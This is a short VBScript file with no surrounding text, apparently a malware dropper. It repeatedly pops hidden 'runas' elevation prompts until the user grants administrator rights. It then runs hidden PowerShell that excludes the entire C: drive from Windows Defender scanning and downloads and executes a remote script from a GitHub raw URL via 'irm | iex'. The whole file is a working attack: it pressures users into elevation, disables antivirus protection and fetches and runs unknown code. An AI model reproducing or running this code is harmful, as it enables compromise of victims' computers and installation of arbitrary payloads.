Set objShell = CreateObject("Shell.Application")
Set fso = CreateObject("Scripting.FileSystemObject")
Set wshShell = CreateObject("WScript.Shell")

flagFile = wshShell.ExpandEnvironmentStrings("%TEMP%") & "\admin_flag.tmp"

Function IsElevated()
    On Error Resume Next
    IsElevated = (wshShell.Run("net session", 0, True) = 0)
    On Error GoTo 0
End Function

If Not WScript.Arguments.Named.Exists("elevate") Then
    Do
        If fso.FileExists(flagFile) Then WScript.Quit
        objShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevate", "", "runas", 0
        WScript.Sleep 1000
    Loop
Else
    fso.CreateTextFile(flagFile, True).Write "ok"
End If

WScript.Sleep 3000
wshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath 'C:\'; irm 'https://raw.githubusercontent.com/srap18/ddoss/main/1122' | iex""", 0, False
